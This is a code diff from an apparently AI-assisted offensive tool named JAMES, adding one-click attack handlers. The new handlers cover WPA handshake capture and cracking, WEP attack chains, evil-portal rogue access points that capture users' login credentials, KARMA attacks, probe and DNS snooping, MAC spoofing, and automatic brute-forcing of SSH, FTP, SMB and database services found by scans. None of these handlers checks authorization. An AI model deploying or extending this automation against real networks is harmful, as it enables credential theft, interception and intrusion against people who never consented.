-            return "[!] No interface specified. Use: autopwn <interface>\n    Or set one first: set interface wlan0"
-        wordlist = self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
-        self.context["interface"] = iface
+        iface = m.group(1) if m.lastindex and m.group(1) else self.context.get("interface", "")
 
+        # Auto-resolve prerequisites
+        try:
+            iface = self.orch.ensure_wireless_interface(iface)
+            wordlist = self.orch.ensure_wordlist(
+                self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
+            )
+        except RuntimeError as e:
+            return f"[!] {e}"
+
+        self.context["interface"] = iface
 
         t = threading.Thread(
             target=self.orch.auto_wifi_pwn,
@@ -834,11 +950,28 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
         )
         t.start()
 
-        return (f"🔥 AutoPwn launched on {iface}\n"
-                f"   Wordlist: {wordlist}\n\n"
-                f"   The workflow is running in the background.\n"
-                f"   Switch to the ⚡ Dashboard tab to watch progress in real-time.\n\n"
-                f"   💡 To change the wordlist: set wordlist /path/to/wordlist.txt")
+        return (f"🤖 AUTOPILOT launched on {iface}\n\n"
+                f"   Pipeline:\n"
+                f"     1. Generate WiFi wordlists\n"
+                f"     2. Scan & rank all WPA networks\n"
+                f"     3. For each AP (up to 5):\n"
+                f"        a. PMKID capture (clientless)\n"
+                f"        b. Handshake capture (deauth)\n"
+                f"        c. 6-stage enhanced crack\n"
+                f"     4. Auto-cleanup & restore\n\n"
+                f"   Wordlist: {wordlist}\n"
+                f"   Switch to ⚡ Dashboard to watch progress.")
+
+    def _do_install_deps(self, m, raw) -> str:
+        """Auto-install missing pentesting dependencies."""
+        t = threading.Thread(target=self.orch.auto_install_deps, daemon=True)
+        t.start()
+        return ("🔧 Auto-installing dependencies in background...\n\n"
+                "   Checking & installing:\n"
+                "     aircrack-ng, hashcat, john, nmap, hydra, nikto,\n"
+                "     gobuster, hcxtools, wifite, reaver, masscan,\n"
+                "     responder, enum4linux, sqlmap, sslscan, ettercap\n\n"
+                "   Switch to ⚡ Dashboard to watch progress.")
 
     def _execute_skill_steps(self, skill: dict):
         self.orch.execute_skill_steps(skill, self.context)
@@ -1159,7 +1292,7 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
     def _do_remote_access(self, m, raw) -> str:
         """Enable SSH + remote access on this machine."""
         import subprocess
-        from james.remote.server import get_local_ip
+        from james.utils.net import get_local_ip
 
         ip = get_local_ip()
         lines = ["🌐 Configuring remote access...\n"]
@@ -1241,9 +1374,14 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
         return "\n".join(lines)
 
     def _do_scan_aps(self, m, raw) -> str:
-        iface = m.group(1) if m.lastindex and m.group(1) else self.context.get("monitor_interface") or self.context.get("interface")
-        if not iface:
-            return "[!] No interface specified. Use: scan aps wlan0\n    Or set one first: list interfaces"
+        iface = m.group(1) if m.lastindex and m.group(1) else self.context.get("monitor_interface") or self.context.get("interface", "")
+
+        # Auto-resolve prerequisites
+        try:
+            iface = self.orch.ensure_wireless_interface(iface)
+        except RuntimeError as e:
+            return f"[!] {e}"
+
         self.context["interface"] = iface.replace("mon", "") if iface.endswith("mon") else iface
         result = self.orch.scan_nearby_aps(iface)
         aps = result.get("aps", [])
@@ -1268,9 +1406,15 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
 
     def _do_wash_scan(self, m, raw) -> str:
         """Scan for WPS-enabled access points using wash."""
-        iface = m.group(1) if m.lastindex and m.group(1) else self.context.get("monitor_interface") or self.context.get("interface")
-        if not iface:
-            return "[!] No interface. Use: wash wlan0mon\n    Enable monitor mode first."
+        iface = m.group(1) if m.lastindex and m.group(1) else self.context.get("monitor_interface") or self.context.get("interface", "")
+
+        # Auto-resolve prerequisites
+        try:
+            iface = self.orch.ensure_wireless_interface(iface)
+            iface = self.orch.ensure_monitor_mode(iface)
+        except RuntimeError as e:
+            return f"[!] {e}"
+
         result = self.orch.reaver.wash_scan(iface)
         aps = result.get("aps", [])
         if not aps:
@@ -1292,9 +1436,14 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
     def _do_wep_attack(self, m, raw) -> str:
         """WEP attack chain: fake auth → ARP replay → crack."""
         bssid = m.group(1)
-        iface = m.group(2) if m.lastindex and m.lastindex >= 2 and m.group(2) else self.context.get("monitor_interface") or self.context.get("interface")
-        if not iface:
-            return "[!] Need an interface. Use: wep attack <BSSID> <iface>\n    Enable monitor first."
+        iface = m.group(2) if m.lastindex and m.lastindex >= 2 and m.group(2) else self.context.get("monitor_interface") or self.context.get("interface", "")
+
+        # Auto-resolve prerequisites
+        try:
+            iface = self.orch.ensure_wireless_interface(iface)
+            iface = self.orch.ensure_monitor_mode(iface)
+        except RuntimeError as e:
+            return f"[!] {e}"
 
         lines = ["⚡ WEP Attack Chain", f"  Target: {bssid}", f"  Interface: {iface}", ""]
 
@@ -1495,6 +1644,7 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
     def _do_clear(self, m, raw) -> str:
         self.context.clear()
         self.history.clear()
+        self.ai.clear_history()
         # Remove persisted context file
         try:
             self.CONTEXT_FILE.unlink(missing_ok=True)
@@ -1503,22 +1653,73 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
         return "🔄 Session context and history cleared."
 
     def _do_capture(self, m, raw) -> str:
-        iface = m.group(1) if m.group(1) else self.context.get("monitor_interface")
-        if not iface:
-            return "[!] No interface specified."
-        result = self.orch.layer.run(
-            f"timeout 30 airodump-ng {iface} --output-format csv -w /tmp/james_capture",
-            sudo=True, timeout=35
-        )
-        return f"📡 Capture on {iface} complete.\n  Output: /tmp/james_capture-01.csv"
+        iface = m.group(1) if m.group(1) else self.context.get("monitor_interface", "")
+
+        # Auto-resolve prerequisites
+        try:
+            iface = self.orch.ensure_wireless_interface(iface)
+            iface = self.orch.ensure_monitor_mode(iface)
+        except RuntimeError as e:
+            return f"[!] {e}"
+
+        bssid = self.context.get("target_bssid", "")
+        cap_prefix = "/tmp/james_capture"
+        self.orch.layer.run(f"rm -f {cap_prefix}*")
+
+        # Use targeted capture if BSSID is known
+        import time
+        if bssid:
+            proc = self.orch.aircrack.start_airodump(
+                iface, bssid=bssid, write_prefix=cap_prefix
+            )
+        else:
+            proc = self.orch.aircrack.start_airodump(
+                iface, write_prefix=cap_prefix
+            )
+        time.sleep(30)
+        self.orch.layer.kill_background(proc)
+
+        cap_file = f"{cap_prefix}-01.cap"
+        lines = [f"📡 Capture on {iface} complete."]
+
+        from pathlib import Path
+        if bssid and Path(cap_file).exists() and self.orch.aircrack.check_handshake(cap_file, bssid):
+            lines.append("✅ Handshake found in capture!")
+            self.context["capture_file"] = cap_file
+
+            # Auto-chain: start cracking
+            wordlist = self.orch.ensure_wordlist(
+                self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
+            )
+            lines.append(f"🔓 Auto-cracking with {wordlist}...")
+            t = threading.Thread(
+                target=self.orch.crack_wpa_smart,
+                args=(cap_file, wordlist, bssid),
+                daemon=True
+            )
+            t.start()
+            lines.append("   Switch to ⚡ Dashboard to watch progress.")
+        else:
+            lines.append(f"  Output: {cap_prefix}-01.csv")
+            if bssid:
+                lines.append("  ⚠️ No handshake found. Try deauthing clients while capturing.")
+
+        return "\n".join(lines)
 
     # ── one-click hack handlers ─────────────────────────────────
 
     def _do_oneclick_wifi_blitz(self, m, raw) -> str:
-        iface = m.group(1) if m.group(1) else self.context.get("interface")
-        if not iface:
-            return "[!] No interface specified. Use: wifi blitz <interface>\n    Or: set interface wlan0"
-        wordlist = self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
+        iface = m.group(1) if m.group(1) else self.context.get("interface", "")
+
+        # Auto-resolve prerequisites
+        try:
+            iface = self.orch.ensure_wireless_interface(iface)
+            wordlist = self.orch.ensure_wordlist(
+                self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
+            )
+        except RuntimeError as e:
+            return f"[!] {e}"
+
         self.context["interface"] = iface
 
 
@@ -1617,6 +1818,142 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
                 f"   Interface: {iface}\n\n"
                 f"   Switch to ⚡ Dashboard to watch real-time progress.")
 
+    def _do_pineapple_campaign(self, m, raw) -> str:
+        iface = (m.group(1) if m.group(1) else
+                 self.context.get("interface") or
+                 self.context.get("monitor_interface"))
+        if not iface:
+            iface = self.orch.ensure_wireless_interface("")
+        if not iface:
+            return "[!] No wireless interface found. Use: set interface wlan0"
+
+        portal = "wifi_login"
+        if "hotel" in raw.lower():
+            portal = "hotel_login"
+        elif "social" in raw.lower():
+            portal = "social_login"
+
+        t = threading.Thread(
+            target=self.orch.oneclick_pineapple,
+            args=(iface,), kwargs={"portal": portal},
+            daemon=True
+        )
+        t.start()
+        return (f"🍍 WiFi Pineapple Campaign launched!\n\n"
+                f"   Interface: {iface}\n"
+                f"   Portal: {portal}\n\n"
+                f"   Phases: Scan → Probe Harvest → Evil Portal → Collect → Report\n"
+                f"   Switch to ⚡ Dashboard for real-time progress.")
+
+    def _do_evil_portal(self, m, raw) -> str:
+        iface = (m.group(1) if m.group(1) else
+                 self.context.get("interface"))
+        if not iface:
+            iface = self.orch.ensure_wireless_interface("")
+        if not iface:
+            return "[!] No wireless interface. Use: set interface wlan0"
+
+        portal = "wifi_login"
+        if "hotel" in raw.lower():
+            portal = "hotel_login"
+        elif "social" in raw.lower():
+            portal = "social_login"
+
+        ssid = self.context.get("target_ssid", "Free_WiFi")
+        channel = int(self.context.get("target_channel", 6))
+
+        result = self.orch.pineap.start_evil_portal(
+            interface=iface, ssid=ssid, channel=channel, portal=portal
+        )
+        if result.get("error"):
+            return f"[!] Evil Portal failed: {result['error']}"
+
+        return (f"👿 Evil Portal LIVE!\n\n"
+                f"   SSID:    {ssid}\n"
+                f"   Portal:  {portal}\n"
+                f"   Gateway: 10.0.0.1\n"
+                f"   Creds:   {result['creds_log']}\n\n"
+                f"   Clients will see the captive portal on connection.\n"
+                f"   Type 'show creds' to see captured credentials.\n"
+                f"   Type 'stop pineapple' to shutdown.")
+
+    def _do_karma_attack(self, m, raw) -> str:
+        iface = (m.group(1) if m.group(1) else
+                 self.context.get("interface"))
+        if not iface:
+            iface = self.orch.ensure_wireless_interface("")
+        if not iface:
+            return "[!] No wireless interface. Use: set interface wlan0"
+
+        result = self.orch.pineap.start_karma(interface=iface)
+        mode = "hostapd-mana (full KARMA)" if result.get("mana") else "hostapd (basic)"
+        return (f"👹 KARMA Attack Active!\n\n"
+                f"   Mode: {mode}\n"
+                f"   Responding to ALL probe requests\n"
+                f"   Clients auto-connecting to rogue AP\n\n"
+                f"   Type 'track clients' to see connections.\n"
+                f"   Type 'stop pineapple' to shutdown.")
+
+    def _do_harvest_probes(self, m, raw) -> str:
+        iface = (m.group(1) if m.group(1) else
+                 self.context.get("monitor_interface") or
+                 self.context.get("interface"))
+        if not iface:
+            return "[!] Need a monitor-mode interface. Use: enable monitor wlan0"
+
+        self._reply_async("📱 Harvesting probe requests (30s)...")
+        result = self.orch.pineap.harvest_probes(iface, duration=30)
+        lines = [f"📱 Probe Requests — {result['count']} unique devices\n"]
+        for p in result.get("probes", [])[:25]:
+            lines.append(f"  {p['mac']}  →  \"{p['ssid']}\"")
+        if result["count"] > 25:
+            lines.append(f"\n  ... and {result['count'] - 25} more (see {result['log']})")
+        return "\n".join(lines)
+
+    def _do_track_clients(self, m, raw) -> str:
+        result = self.orch.pineap.track_clients()
+        if result["count"] == 0:
+            return "💻 No clients connected to rogue AP.\n   Launch 'evil portal' or 'karma' first."
+        lines = [f"💻 Connected Clients — {result['count']}\n"]
+        for c in result["clients"]:
+            lines.append(f"  {c['ip']:<16} {c['mac']}  ({c.get('hostname', '?')})")
+        return "\n".join(lines)
+
+    def _do_snoop_dns(self, m, raw) -> str:
+        result = self.orch.pineap.snoop_dns(limit=40)
+        if result["count"] == 0:
+            return "🌐 No DNS queries logged yet.\n   Launch 'evil portal' or 'karma' first."
+        lines = [f"🌐 DNS Queries — {result['count']} total\n"]
+        for q in result["queries"][-30:]:
+            lines.append(f"  [{q['type']}] {q['domain']:<40} ← {q['client']}")
+        return "\n".join(lines)
+
+    def _do_spoof_mac(self, m, raw) -> str:
+        iface = m.group(1) if m.group(1) else self.context.get("interface")
+        mac = m.group(2) if m.lastindex and m.lastindex >= 2 else None
+        if not iface:
+            return "[!] Specify interface: spoof mac wlan0 [XX:XX:XX:XX:XX:XX]"
+        result = self.orch.pineap.spoof_mac(iface, mac)
+        if result["success"]:
+            return f"🎭 MAC address spoofed!\n   New MAC: {result['new_mac']}"
+        return "[!] MAC spoofing failed. Is macchanger installed?"
+
+    def _do_stop_pineapple(self, m, raw) -> str:
+        self.orch.pineap.stop_all()
+        return "🛑 PineAP services stopped.\n   hostapd, dnsmasq, captive portal all terminated."
+
+    def _do_show_portal_creds(self, m, raw) -> str:
+        creds = self.orch.pineap.get_creds()
+        if not creds:
+            return "🔑 No credentials captured yet.\n   Launch 'evil portal' and wait for clients."
+        lines = [f"🔑 Captured Credentials — {len(creds)}\n"]
+        for c in creds:
+            ts = c.get("_time", "?")[:19]
+            ip = c.get("_client_ip", "?")
+            filtered = {k: v for k, v in c.items() if not k.startswith("_")}
+            lines.append(f"  [{ts}] {ip}: {filtered}")
+        return "\n".join(lines)
+
     def _do_connect_open_wifi(self, m, raw) -> str:
         t = threading.Thread(
             target=self.orch.connect_open_wifi,
@@ -1627,6 +1964,152 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
         return (f"🌐 Open Wi-Fi Auto-Connect launched!\n\n"
                 f"   Scanning for unpassworded access points...\n"
                 f"   The strongest network will be automatically connected to.\n\n"
+                f"   Switch to ⚡ Dashboard to watch real-time progress.")
+
+    def _do_scan_and_attack(self, m, raw) -> str:
+        """Compound command: full scan → auto-attack chain."""
+        target = m.group(1).strip()
+        self.context["target"] = target
+
+        def _scan_then_attack():
+            # Phase 1: Full scan
+            self.orch._print(f"\n{'━' * 50}")
+            self.orch._print(f"⚡ SCAN & ATTACK — {target}")
+            self.orch._print(f"{'━' * 50}")
+
+            self.orch._print("\n[PHASE 1] Deep Reconnaissance...")
+            result = self.orch.full_scan(target)
+            self._remember_services(target, result)
+
+            hosts = result.get("hosts", [])
+            services_found = []
+            for h in hosts:
+                for p in h.get("ports", []):
+                    services_found.append({
+                        "ip": h["address"], "port": p["port"],
+                        "service": p.get("service", ""), "version": p.get("version", "")
+                    })
+
+            if not services_found:
+                self.orch._print("  ⚠️ No open services found. Aborting attack phase.")
+                return
+
+            self.orch._print(f"  Found {len(services_found)} open service(s)")
+
+            # Phase 2: Auto-attack based on discovered services
+            self.orch._print("\n[PHASE 2] Auto-Attacking discovered services...")
+
+            for svc in services_found:
+                ip, port, service = svc["ip"], svc["port"], svc["service"]
+
+                # Web services → web pwn
+                if port in (80, 443, 8080, 8443) or service in ("http", "https"):
+                    url = f"{'https' if port == 443 else 'http'}://{ip}:{port}"
+                    self.orch._print(f"\n  → Web attack chain on {url}")
+                    try:
+                        self.orch._print("    WAF detection...")
+                        self.orch.wafdetect.detect(url)
+                        self.orch._print("    Directory brute-force...")
+                        self.orch.dir_bust(url)
+                        self.orch._print("    Nikto scan...")
+                        self.orch.nikto_scan(url)
+                    except Exception as e:
+                        self.orch._print(f"    ⚠️ Web attack error: {e}")
+
+                # SSH/FTP/MySQL → brute-force
+                elif port in (22, 21, 3306, 5432) or service in ("ssh", "ftp", "mysql", "postgresql"):
+                    proto = service or {22: "ssh", 21: "ftp", 3306: "mysql", 5432: "postgres"}.get(port, "ssh")
+                    self.orch._print(f"\n  → Brute-force {ip}:{port} ({proto})")
+                    try:
+                        self.orch.brute_service(ip, proto)
+                    except Exception as e:
+                        self.orch._print(f"    ⚠️ Brute error: {e}")
+
+                # SMB → enum + brute
+                elif port == 445 or service in ("microsoft-ds", "smb"):
+                    self.orch._print(f"\n  → SMB enumeration on {ip}")
+                    try:
+                        self.orch.smb_enum(ip)
+                        self.orch.brute_service(ip, "smb")
+                    except Exception as e:
+                        self.orch._print(f"    ⚠️ SMB error: {e}")
+
+            self.orch._print(f"\n{'━' * 50}")
+            self.orch._print(f"🏁 Scan & Attack Complete — {len(services_found)} services processed")
+            self.orch._print(f"{'━' * 50}")
+
+        t = threading.Thread(target=_scan_then_attack, daemon=True)
+        t.start()
+
+        return (f"⚡ Scan & Attack launched → {target}\n\n"
+                f"   Phase 1: Deep nmap reconnaissance\n"
+                f"   Phase 2: Auto-attack every discovered service\n\n"
+                f"   Switch to ⚡ Dashboard to watch real-time progress.")
+
+    def _do_auto_attack_services(self, m, raw) -> str:
+        """Attack all previously discovered services from scan history."""
+        target = m.group(1).strip() if m.lastindex and m.group(1) else self.context.get("target", "")
+        if not target:
+            return "[!] No target. Run a scan first or: auto attack <target>"
+
+        discovered = self.context.get("discovered_services", {}).get(target, {})
+        ports = discovered.get("ports", [])
+        services = discovered.get("services", [])
+
+        if not ports:
+            # If no services cached, do a quick scan first
+            return self._do_scan_and_attack(m, raw)
+
+        def _attack_all():
+            self.orch._print(f"\n{'━' * 50}")
+            self.orch._print(f"🔥 AUTO-ATTACK — {target}")
+            self.orch._print(f"   {len(ports)} known port(s), {len(services)} service(s)")
+            self.orch._print(f"{'━' * 50}")
+
+            # Brute-force services
+            brute_map = {"ssh": "ssh", "ftp": "ftp", "mysql": "mysql",
+                         "postgresql": "postgres", "microsoft-ds": "smb",
+                         "ms-wbt-server": "rdp", "vnc": "vnc"}
+
+            for svc_name in services:
+                proto = brute_map.get(svc_name.lower())
+                if proto:
+                    self.orch._print(f"\n  → Brute-forcing {target} ({proto})")
+                    try:
+                        self.orch.brute_service(target, proto)
+                    except Exception as e:
+                        self.orch._print(f"    ⚠️ {e}")
+
+            # Web services
+            web_ports = [p for p in ports if any(w in p for w in ("80/", "443/", "8080/", "8443/"))]
+            if web_ports or any(s in services for s in ("http", "https")):
+                url = f"http://{target}"
+                self.orch._print(f"\n  → Web attack chain on {url}")
+                try:
+                    self.orch.wafdetect.detect(url)
+                    self.orch.dir_bust(url)
+                    self.orch.nikto_scan(url)
+                except Exception as e:
+                    self.orch._print(f"    ⚠️ Web error: {e}")
+
+            # SMB
+            if any(s in services for s in ("microsoft-ds", "smb", "netbios-ssn")):
+                self.orch._print(f"\n  → SMB enumeration on {target}")
+                try:
+                    self.orch.smb_enum(target)
+                except Exception as e:
+                    self.orch._print(f"    ⚠️ {e}")
+
+            self.orch._print(f"\n{'━' * 50}")
+            self.orch._print(f"🏁 Auto-Attack Complete")
+            self.orch._print(f"{'━' * 50}")
+
+        t = threading.Thread(target=_attack_all, daemon=True)
+        t.start()
+
+        return (f"🔥 Auto-Attack launched → {target}\n\n"
+                f"   Attacking {len(ports)} port(s) with {len(services)} known service(s)\n"
+                f"   Brute-force + Web audit + SMB enum\n\n"
                 f"   Switch to ⚡ Dashboard to watch real-time progress.")
 
     # ── helpers ─────────────────────────────────────────────────
@@ -1657,6 +2140,21 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
         # auto-suggest next steps
         lines.append(self._suggest_next(hosts))
         return "\n".join(lines)
+
+    def _count_attackable_services(self, hosts: list) -> int:
+        """Count services that JAMES can auto-attack (SSH, FTP, SMB, HTTP, etc.)."""
+        ATTACK_SERVICES = {"ssh", "ftp", "http", "https", "smb", "microsoft-ds",
+                           "netbios-ssn", "mysql", "postgresql", "ms-wbt-server",
+                           "vnc", "telnet", "http-proxy"}
+        ATTACK_PORTS = {21, 22, 23, 25, 80, 139, 443, 445, 3306, 3389, 5432, 5900, 8080, 8443}
+        count = 0
+        for h in hosts:
+            for p in h.get("ports", []):
+                svc = p.get("service", "").lower()
+                port = p.get("port", 0)
+                if svc in ATTACK_SERVICES or port in ATTACK_PORTS:
+                    count += 1
+        return count
 
     def _remember_services(self, target: str, result: dict):
         """Track discovered services/ports per target in context for smart suggestions."""
@@ -1760,7 +2258,12 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
             self.context["target"] = text
             return f"🎯 Domain set: {text}\n    Try: osint {text}  or  scan {text}"
 
-        # Fuzzy suggestion
+        # Try LLM conversational response (explain, advise, strategize)
+        ai_reply = self.ai.chat_only(text, self.context)
+        if ai_reply:
+            return ai_reply
+
+        # Fuzzy suggestion (offline fallback)
         suggestion = self._fuzzy_suggest(text)
         if suggestion:
             return (
@@ -1820,6 +2323,14 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
         ("web pwn",   "web pwn <url>"),
         ("stealth",   "stealth recon <target>"),
         ("evil twin", "evil twin <iface>"),
+        ("pineapple", "pineapple <iface>"),
+        ("portal",    "evil portal <iface>"),
+        ("karma",     "karma <iface>"),
+        ("probes",    "harvest probes <iface>"),
+        ("clients",   "track clients"),
+        ("dns log",   "snoop dns"),
+        ("creds",     "show creds"),
+        ("mac spoof", "spoof mac <iface>"),
         ("oneclick",  "wifi blitz / network dominate / web pwn / stealth recon"),
         ("open wifi", "connect open wifi"),
         ("need wifi", "connect open wifi"),
